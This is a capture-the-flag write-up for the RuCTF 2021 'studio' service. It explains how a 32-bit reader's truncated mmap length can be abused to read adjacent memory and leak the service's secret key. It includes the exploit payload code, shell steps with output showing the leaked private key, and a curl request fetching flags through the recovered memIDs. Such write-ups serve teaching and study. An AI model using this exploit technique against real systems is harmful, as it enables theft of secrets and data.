# Studio

Service job handling algorithm:
1. Receive a binary file with the payload
2. Schedule a job with some monotonically increasing ID: time.Now().UnixNano()
3. Generate the memID: hash the job ID with the HMAC SHA256 function using the service secret key.
4. Allocate a shared memory region, identified by the generated memID
5. Spin up the container and execute the payload to write into the allocated shared memory region
6. After container exit, read the job result from the shared memory.
7. Deallocate the shared memory region

## Vulnerability

Service has a vulnerability in the 6th step of the main algorithm. Job result reader is the pre-generated 32-bit binary ([source code](https://github.com/HackerDom/ructf-2021/blob/main/services/studio/payload/main.c)). It executes the following algorithm:
1. Read the secret key to convert the integer jobID into the memID. `create_key` function performs `open()` followed by the `mmap()` to read the secret key into the process memory.
2. Read the shared memory region from the /dev/shm/memID and write it to the stdout

The reader uses the `shm_open` followed by `mmap` to read the job result. Job result is stored in the following format: [result_len (8bytes)][result_content (result_len bytes)].

Since the mmap has the size_t as the length in its signature and the binary is 32-bit, it will read only the first 4 bytes of the `result_len`. 
```sh
void *mmap(void *addr, size_t length, int prot, int flags,
                  int fd, off_t offset);
```
During the consecutive reading of the mapped memory region, the reader will try to read all the `result_len` bytes. This will result in the reading of the adjacent memory regions. The only thing left is to pick a good result_len so mmap will allocate us close to the mmap'ed `secret_key` a good spot in the process virtual address space. In this example, I use the 4295229444 = 2^32 (needed to read the process memory after the mmap'ed region) + 2^18 (needed to mmap near to the secret key) + 2^2 ("abc2" length).

```C
sploits/studio/payload/main.c:

    p = addr;
    len = strlen(to_write);
    size_t actual_len = 4295229444; // 2^32 (needed to read the process memory after the mmap'ed region) + 2^18 (needed to mmap near to the secret key) + 2^2 ("abc2" length)
    //write the length of the message to the header
    memcpy(p, &actual_len, sizeof(size_t));
    p += sizeof(size_t);
    //write the data to the memory
    memcpy(p, to_write, len);
```

Here is how to manually trigger this vulnerability: 

```sh
# allocate the shared memory region
$ services/studio/allocmemory/allocmemory 1337 container-svc/secret.key
9C179F442AE6D1ED56581D1600148F1BFE3ED19C0E1BFD44DF404073D434DBEA

# execute the exploit payload
$ sploits/studio/payload/vuln 9C179F442AE6D1ED56581D1600148F1BFE3ED19C0E1BFD44DF404073D434DBEA ../../../services/studio/container-svc/secret.key

# demonstate that the exploit wrote the result length equal to 2^32 + 2^18 + 2^2 
$ hexdump /dev/shm/9C179F442AE6D1ED56581D1600148F1BFE3ED19C0E1BFD44DF404073D434DBEA
0000000 0004 0004 0001 0000 6261 3263 0000 0000
0000010 0000 0000 0000 0000 0000 0000 0000 0000
*
004e200

# launch the result reader
$ services/studio/getmemory/getmemory 1337 ../../../services/studio/container-svc/secret.key > exploit_out
Segmentation fault (core dumped)

# we have a full service private key now
$ grep -abo "BEGIN SERVICE PRIVATE KEY" exploit_out
266235:BEGIN SERVICE PRIVATE KEY

$ grep -abo "END SERVICE PRIVATE KEY" exploit_out
586268:END SERVICE PRIVATE KEY
```

That's it, the only thing left to do is to use the monotonicaly increasing jobID to generate the possible hashes:

```sh 
$ services/studio/generatekey/generatekey 1 expl_secret.key
8A858C4D98A0B04E1C6E4D2CF5991CA60D37F9DA1632CA9843537721B153B7E9
$ services/studio/generatekey/generatekey 2 expl_secret.key
32395190FE61DE2E0C73F0E9362D614F3FB2C7FD8D58E318D7E5DC40C3FAEFBC

And so on...
```

Then, use the generated memID's to seek for flags in the job results.
```sh 
curl --location --request GET 'http://localhost:8000/api/v1/jobs/270F6BC566D205B0D56E1B2F0135F5F1F205B35F8A2DD8726F59915C6CA592FF'
{'code': 200, 'msg': 'ok', 'data': {'run_id': '1633271220036678587', 'id': '270F6BC566D205B0D56E1B2F0135F5F1F205B35F8A2DD8726F59915C6CA592FF', 'status': 'success', 'result': 'OXR0D9NFITKRIK5QBGMPHAHYCY52ASD=', 'time_info': {'AllocMemStart': '2021-10-03T17:27:00.058709304+03:00', 'StartContainer': '2021-10-03T17:27:00.08080791+03:00', 'StopContainer': '2021-10-03T17:27:00.532870379+03:00', 'ReadMem': '2021-10-03T17:27:00.532870843+03:00', 'DeallocMem': '2021-10-03T17:27:00.538250621+03:00'}}}
```



